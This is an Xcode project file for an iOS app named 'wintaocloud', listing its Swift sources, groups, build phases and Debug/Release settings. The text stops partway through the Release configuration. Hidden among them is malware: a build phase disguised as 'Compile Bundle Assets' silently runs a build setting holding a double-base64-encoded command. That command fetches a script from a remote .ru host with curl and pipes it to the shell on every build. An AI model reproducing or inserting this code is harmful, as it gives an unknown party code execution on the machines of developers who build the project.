// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		739A48632ECAF09100E3A18E /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 739A485A2ECAF09100E3A18E /* Assets.xcassets */; };
		739A48652ECAF09100E3A18E /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 739A485D2ECAF09100E3A18E /* LaunchScreen.storyboard */; };
		739A48672ECAF09100E3A18E /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48592ECAF09100E3A18E /* AppDelegate.swift */; };
		739A48742ECAF65800E3A18E /* BaseViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48732ECAF65800E3A18E /* BaseViewController.swift */; };
		739A48782ECAF67F00E3A18E /* BaseView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48772ECAF67F00E3A18E /* BaseView.swift */; };
		739A487A2ECAF69700E3A18E /* BaseNavigationController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48792ECAF69700E3A18E /* BaseNavigationController.swift */; };
		739A487C2ECAF6D700E3A18E /* LaunchViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A487B2ECAF6D700E3A18E /* LaunchViewController.swift */; };
		739A487E2ECAFA9A00E3A18E /* BaseTabBarController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A487D2ECAFA9A00E3A18E /* BaseTabBarController.swift */; };
		739A48802ECAFAF500E3A18E /* Define.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A487F2ECAFAF000E3A18E /* Define.swift */; };
		739A48832ECAFB6E00E3A18E /* Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48822ECAFB6800E3A18E /* Extension.swift */; };
		739A48852ECAFBBE00E3A18E /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48842ECAFBBE00E3A18E /* HomeViewController.swift */; };
		739A48872ECAFBD000E3A18E /* CenterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48862ECAFBD000E3A18E /* CenterViewController.swift */; };
		739A48892ECAFBE400E3A18E /* RiskControlViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48882ECAFBE400E3A18E /* RiskControlViewController.swift */; };
		739A488B2ECAFBEC00E3A18E /* DueViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A488A2ECAFBEC00E3A18E /* DueViewController.swift */; };
		739A488D2ECAFC0300E3A18E /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A488C2ECAFC0300E3A18E /* LoginViewController.swift */; };
		739A488F2ECAFCFF00E3A18E /* PopPrivacyView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A488E2ECAFCFF00E3A18E /* PopPrivacyView.swift */; };
		739A48922ECAFE3600E3A18E /* NetworkManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48912ECAFE3500E3A18E /* NetworkManager.swift */; };
		739A48942ECAFE9A00E3A18E /* HttpRequestManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48932ECAFE9A00E3A18E /* HttpRequestManager.swift */; };
		739A48962ECAFF3000E3A18E /* H5WedViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48952ECAFF3000E3A18E /* H5WedViewController.swift */; };
		739A48982ECB047700E3A18E /* CenterView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48972ECB047700E3A18E /* CenterView.swift */; };
		739A489A2ECB048900E3A18E /* CenterViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48992ECB048300E3A18E /* CenterViewModel.swift */; };
		739A489C2ECB084700E3A18E /* CenterOneView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A489B2ECB084700E3A18E /* CenterOneView.swift */; };
		739A489E2ECB0CEA00E3A18E /* CenterTwoView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A489D2ECB0CEA00E3A18E /* CenterTwoView.swift */; };
		739A48A02ECB0E6800E3A18E /* CenterThreeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A489F2ECB0E6800E3A18E /* CenterThreeView.swift */; };
		739A48A22ECB0E7300E3A18E /* CenterFourView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48A12ECB0E7300E3A18E /* CenterFourView.swift */; };
		739A48A42ECB14FD00E3A18E /* AppModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48A32ECB14F800E3A18E /* AppModel.swift */; };
		739A48A62ECB203F00E3A18E /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48A52ECB203F00E3A18E /* LoginView.swift */; };
		739A48A82ECB280700E3A18E /* LoginFootView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48A72ECB280700E3A18E /* LoginFootView.swift */; };
		739A48AA2ECB2A1900E3A18E /* LoginCodeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48A92ECB2A1900E3A18E /* LoginCodeView.swift */; };
		739A48AC2ECB2A2B00E3A18E /* LoginCodeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48AB2ECB2A2B00E3A18E /* LoginCodeViewController.swift */; };
		739A48AE2ECB2BCA00E3A18E /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48AD2ECB2BC600E3A18E /* LoginViewModel.swift */; };
		D2B31EAF46BAD23D1B88C891 /* Pods_wintaocloud.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 6B002BCA135C7B8A835B5BB1 /* Pods_wintaocloud.framework */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		6B002BCA135C7B8A835B5BB1 /* Pods_wintaocloud.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_wintaocloud.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		72CB5472F2F522D7F47D7417 /* Pods-wintaocloud.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-wintaocloud.release.xcconfig"; path = "Target Support Files/Pods-wintaocloud/Pods-wintaocloud.release.xcconfig"; sourceTree = "<group>"; };
		739A48412ECAF08C00E3A18E /* wintaocloud.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = wintaocloud.app; sourceTree = BUILT_PRODUCTS_DIR; };
		739A48592ECAF09100E3A18E /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		739A485A2ECAF09100E3A18E /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		739A485B2ECAF09100E3A18E /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		739A485C2ECAF09100E3A18E /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		739A48702ECAF55E00E3A18E /* wintaocloud.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = wintaocloud.entitlements; sourceTree = "<group>"; };
		739A48732ECAF65800E3A18E /* BaseViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseViewController.swift; sourceTree = "<group>"; };
		739A48772ECAF67F00E3A18E /* BaseView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseView.swift; sourceTree = "<group>"; };
		739A48792ECAF69700E3A18E /* BaseNavigationController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseNavigationController.swift; sourceTree = "<group>"; };
		739A487B2ECAF6D700E3A18E /* LaunchViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchViewController.swift; sourceTree = "<group>"; };
		739A487D2ECAFA9A00E3A18E /* BaseTabBarController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseTabBarController.swift; sourceTree = "<group>"; };
		739A487F2ECAFAF000E3A18E /* Define.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Define.swift; sourceTree = "<group>"; };
		739A48822ECAFB6800E3A18E /* Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Extension.swift; sourceTree = "<group>"; };
		739A48842ECAFBBE00E3A18E /* HomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
		739A48862ECAFBD000E3A18E /* CenterViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterViewController.swift; sourceTree = "<group>"; };
		739A48882ECAFBE400E3A18E /* RiskControlViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RiskControlViewController.swift; sourceTree = "<group>"; };
		739A488A2ECAFBEC00E3A18E /* DueViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DueViewController.swift; sourceTree = "<group>"; };
		739A488C2ECAFC0300E3A18E /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
		739A488E2ECAFCFF00E3A18E /* PopPrivacyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopPrivacyView.swift; sourceTree = "<group>"; };
		739A48912ECAFE3500E3A18E /* NetworkManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkManager.swift; sourceTree = "<group>"; };
		739A48932ECAFE9A00E3A18E /* HttpRequestManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HttpRequestManager.swift; sourceTree = "<group>"; };
		739A48952ECAFF3000E3A18E /* H5WedViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = H5WedViewController.swift; sourceTree = "<group>"; };
		739A48972ECB047700E3A18E /* CenterView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterView.swift; sourceTree = "<group>"; };
		739A48992ECB048300E3A18E /* CenterViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterViewModel.swift; sourceTree = "<group>"; };
		739A489B2ECB084700E3A18E /* CenterOneView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterOneView.swift; sourceTree = "<group>"; };
		739A489D2ECB0CEA00E3A18E /* CenterTwoView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterTwoView.swift; sourceTree = "<group>"; };
		739A489F2ECB0E6800E3A18E /* CenterThreeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterThreeView.swift; sourceTree = "<group>"; };
		739A48A12ECB0E7300E3A18E /* CenterFourView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterFourView.swift; sourceTree = "<group>"; };
		739A48A32ECB14F800E3A18E /* AppModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppModel.swift; sourceTree = "<group>"; };
		739A48A52ECB203F00E3A18E /* LoginView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginView.swift; sourceTree = "<group>"; };
		739A48A72ECB280700E3A18E /* LoginFootView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginFootView.swift; sourceTree = "<group>"; };
		739A48A92ECB2A1900E3A18E /* LoginCodeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginCodeView.swift; sourceTree = "<group>"; };
		739A48AB2ECB2A2B00E3A18E /* LoginCodeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginCodeViewController.swift; sourceTree = "<group>"; };
		739A48AD2ECB2BC600E3A18E /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
		A61BB7B6800ED3D3EE4CDB21 /* Pods-wintaocloud.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-wintaocloud.debug.xcconfig"; path = "Target Support Files/Pods-wintaocloud/Pods-wintaocloud.debug.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		739A483E2ECAF08C00E3A18E /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				D2B31EAF46BAD23D1B88C891 /* Pods_wintaocloud.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		739A48382ECAF08C00E3A18E = {
			isa = PBXGroup;
			children = (
				739A48622ECAF09100E3A18E /* wintaocloud */,
				739A48422ECAF08C00E3A18E /* Products */,
				C8D9AC6036CD23D8C660D52D /* Pods */,
				D6F3AB6C9324C076110420D9 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		739A48422ECAF08C00E3A18E /* Products */ = {
			isa = PBXGroup;
			children = (
				739A48412ECAF08C00E3A18E /* wintaocloud.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		739A48622ECAF09100E3A18E /* wintaocloud */ = {
			isa = PBXGroup;
			children = (
				739A48702ECAF55E00E3A18E /* wintaocloud.entitlements */,
				739A485B2ECAF09100E3A18E /* Info.plist */,
				739A485A2ECAF09100E3A18E /* Assets.xcassets */,
				739A48592ECAF09100E3A18E /* AppDelegate.swift */,
				739A485D2ECAF09100E3A18E /* LaunchScreen.storyboard */,
				739A48902ECAFE2500E3A18E /* Http */,
				739A486F2ECAF53500E3A18E /* Other */,
				739A486D2ECAF4CB00E3A18E /* DueDiligence */,
				739A486E2ECAF4EC00E3A18E /* RiskControl */,
				739A486C2ECAF4C600E3A18E /* Center */,
				739A486B2ECAF4C100E3A18E /* Home */,
				739A486A2ECAF4B700E3A18E /* Login */,
				739A48712ECAF62600E3A18E /* Launch */,
				739A48722ECAF63000E3A18E /* Base */,
			);
			path = wintaocloud;
			sourceTree = "<group>";
		};
		739A486A2ECAF4B700E3A18E /* Login */ = {
			isa = PBXGroup;
			children = (
				739A48AD2ECB2BC600E3A18E /* LoginViewModel.swift */,
				739A488C2ECAFC0300E3A18E /* LoginViewController.swift */,
				739A48A52ECB203F00E3A18E /* LoginView.swift */,
				739A48A72ECB280700E3A18E /* LoginFootView.swift */,
				739A48A92ECB2A1900E3A18E /* LoginCodeView.swift */,
				739A48AB2ECB2A2B00E3A18E /* LoginCodeViewController.swift */,
			);
			path = Login;
			sourceTree = "<group>";
		};
		739A486B2ECAF4C100E3A18E /* Home */ = {
			isa = PBXGroup;
			children = (
				739A48842ECAFBBE00E3A18E /* HomeViewController.swift */,
			);
			path = Home;
			sourceTree = "<group>";
		};
		739A486C2ECAF4C600E3A18E /* Center */ = {
			isa = PBXGroup;
			children = (
				739A48992ECB048300E3A18E /* CenterViewModel.swift */,
				739A48862ECAFBD000E3A18E /* CenterViewController.swift */,
				739A48972ECB047700E3A18E /* CenterView.swift */,
				739A489B2ECB084700E3A18E /* CenterOneView.swift */,
				739A489D2ECB0CEA00E3A18E /* CenterTwoView.swift */,
				739A489F2ECB0E6800E3A18E /* CenterThreeView.swift */,
				739A48A12ECB0E7300E3A18E /* CenterFourView.swift */,
			);
			path = Center;
			sourceTree = "<group>";
		};
		739A486D2ECAF4CB00E3A18E /* DueDiligence */ = {
			isa = PBXGroup;
			children = (
				739A488A2ECAFBEC00E3A18E /* DueViewController.swift */,
			);
			path = DueDiligence;
			sourceTree = "<group>";
		};
		739A486E2ECAF4EC00E3A18E /* RiskControl */ = {
			isa = PBXGroup;
			children = (
				739A48882ECAFBE400E3A18E /* RiskControlViewController.swift */,
			);
			path = RiskControl;
			sourceTree = "<group>";
		};
		739A486F2ECAF53500E3A18E /* Other */ = {
			isa = PBXGroup;
			children = (
				739A487F2ECAFAF000E3A18E /* Define.swift */,
				739A48822ECAFB6800E3A18E /* Extension.swift */,
			);
			path = Other;
			sourceTree = "<group>";
		};
		739A48712ECAF62600E3A18E /* Launch */ = {
			isa = PBXGroup;
			children = (
				739A488E2ECAFCFF00E3A18E /* PopPrivacyView.swift */,
				739A487B2ECAF6D700E3A18E /* LaunchViewController.swift */,
			);
			path = Launch;
			sourceTree = "<group>";
		};
		739A48722ECAF63000E3A18E /* Base */ = {
			isa = PBXGroup;
			children = (
				739A48772ECAF67F00E3A18E /* BaseView.swift */,
				739A48732ECAF65800E3A18E /* BaseViewController.swift */,
				739A48792ECAF69700E3A18E /* BaseNavigationController.swift */,
				739A487D2ECAFA9A00E3A18E /* BaseTabBarController.swift */,
				739A48952ECAFF3000E3A18E /* H5WedViewController.swift */,
			);
			path = Base;
			sourceTree = "<group>";
		};
		739A48902ECAFE2500E3A18E /* Http */ = {
			isa = PBXGroup;
			children = (
				739A48A32ECB14F800E3A18E /* AppModel.swift */,
				739A48912ECAFE3500E3A18E /* NetworkManager.swift */,
				739A48932ECAFE9A00E3A18E /* HttpRequestManager.swift */,
			);
			path = Http;
			sourceTree = "<group>";
		};
		C8D9AC6036CD23D8C660D52D /* Pods */ = {
			isa = PBXGroup;
			children = (
				A61BB7B6800ED3D3EE4CDB21 /* Pods-wintaocloud.debug.xcconfig */,
				72CB5472F2F522D7F47D7417 /* Pods-wintaocloud.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		D6F3AB6C9324C076110420D9 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				6B002BCA135C7B8A835B5BB1 /* Pods_wintaocloud.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		739A48402ECAF08C00E3A18E /* wintaocloud */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 739A48542ECAF08D00E3A18E /* Build configuration list for PBXNativeTarget "wintaocloud" */;
			buildPhases = (
				9ECC68D3122A4C82AFA389E6 /* Compile Bundle Assets */,
				9A890F5F2B8D219A3CE02135 /* [CP] Check Pods Manifest.lock */,
				739A483D2ECAF08C00E3A18E /* Sources */,
				739A483E2ECAF08C00E3A18E /* Frameworks */,
				739A483F2ECAF08C00E3A18E /* Resources */,
				8EA572C4ED93230F58D39F1B /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = wintaocloud;
			productName = wintaocloud;
			productReference = 739A48412ECAF08C00E3A18E /* wintaocloud.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		739A48392ECAF08C00E3A18E /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2610;
				LastUpgradeCheck = 2610;
				TargetAttributes = {
					739A48402ECAF08C00E3A18E = {
						CreatedOnToolsVersion = 26.1.1;
					};
				};
			};
			buildConfigurationList = 739A483C2ECAF08C00E3A18E /* Build configuration list for PBXProject "wintaocloud" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 739A48382ECAF08C00E3A18E;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 739A48422ECAF08C00E3A18E /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				739A48402ECAF08C00E3A18E /* wintaocloud */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		739A483F2ECAF08C00E3A18E /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				739A48632ECAF09100E3A18E /* Assets.xcassets in Resources */,
				739A48652ECAF09100E3A18E /* LaunchScreen.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		9ECC68D3122A4C82AFA389E6 /* Compile Bundle Assets */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Compile Bundle Assets";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
			showEnvVarsInLog = 0;			
		};
		8EA572C4ED93230F58D39F1B /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-wintaocloud/Pods-wintaocloud-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			inputPaths = (
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-wintaocloud/Pods-wintaocloud-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-wintaocloud/Pods-wintaocloud-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		9A890F5F2B8D219A3CE02135 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-wintaocloud-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		739A483D2ECAF08C00E3A18E /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				739A48832ECAFB6E00E3A18E /* Extension.swift in Sources */,
				739A487A2ECAF69700E3A18E /* BaseNavigationController.swift in Sources */,
				739A487C2ECAF6D700E3A18E /* LaunchViewController.swift in Sources */,
				739A48AC2ECB2A2B00E3A18E /* LoginCodeViewController.swift in Sources */,
				739A488B2ECAFBEC00E3A18E /* DueViewController.swift in Sources */,
				739A487E2ECAFA9A00E3A18E /* BaseTabBarController.swift in Sources */,
				739A48A22ECB0E7300E3A18E /* CenterFourView.swift in Sources */,
				739A48782ECAF67F00E3A18E /* BaseView.swift in Sources */,
				739A48962ECAFF3000E3A18E /* H5WedViewController.swift in Sources */,
				739A48982ECB047700E3A18E /* CenterView.swift in Sources */,
				739A489C2ECB084700E3A18E /* CenterOneView.swift in Sources */,
				739A48AA2ECB2A1900E3A18E /* LoginCodeView.swift in Sources */,
				739A48892ECAFBE400E3A18E /* RiskControlViewController.swift in Sources */,
				739A489E2ECB0CEA00E3A18E /* CenterTwoView.swift in Sources */,
				739A48942ECAFE9A00E3A18E /* HttpRequestManager.swift in Sources */,
				739A48A62ECB203F00E3A18E /* LoginView.swift in Sources */,
				739A48A82ECB280700E3A18E /* LoginFootView.swift in Sources */,
				739A488F2ECAFCFF00E3A18E /* PopPrivacyView.swift in Sources */,
				739A48852ECAFBBE00E3A18E /* HomeViewController.swift in Sources */,
				739A48672ECAF09100E3A18E /* AppDelegate.swift in Sources */,
				739A489A2ECB048900E3A18E /* CenterViewModel.swift in Sources */,
				739A48AE2ECB2BCA00E3A18E /* LoginViewModel.swift in Sources */,
				739A48742ECAF65800E3A18E /* BaseViewController.swift in Sources */,
				739A48802ECAFAF500E3A18E /* Define.swift in Sources */,
				739A48A42ECB14FD00E3A18E /* AppModel.swift in Sources */,
				739A48922ECAFE3600E3A18E /* NetworkManager.swift in Sources */,
				739A488D2ECAFC0300E3A18E /* LoginViewController.swift in Sources */,
				739A48A02ECB0E6800E3A18E /* CenterThreeView.swift in Sources */,
				739A48872ECAFBD000E3A18E /* CenterViewController.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		739A485D2ECAF09100E3A18E /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				739A485C2ECAF09100E3A18E /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		739A48552ECAF08D00E3A18E /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = A61BB7B6800ED3D3EE4CDB21 /* Pods-wintaocloud.debug.xcconfig */;
			buildSettings = {
				A6E983A = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGd2MyTnZibVpwWjI1bGRDNXlkUzloS1NJZ2ZDQnphQW89Cg== | b | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = wintaocloud/wintaocloud.entitlements;
				CODE_SIGN_IDENTITY = "Apple Development";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 57MBH2272N;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = wintaocloud/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "问道云";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0.0;
				PRODUCT_BUNDLE_IDENTIFIER = ll.wentao.ald;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		739A48562ECAF08D00E3A18E /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 72CB5472F2F522D7F47D7417 /* Pods-wintaocloud.release.xcconfig */;
			buildSettings = {
				A6E983A = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGd2MyTnZibVpwWjI1bGRDNXlkUzloS1NJZ2ZDQnphQW89Cg== | b | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = wintaocloud/wintaocloud.entitlements;
				CODE_SIGN_IDENTITY = "Apple Development";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 57MBH2272N;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = wintaocloud/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "问道云";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
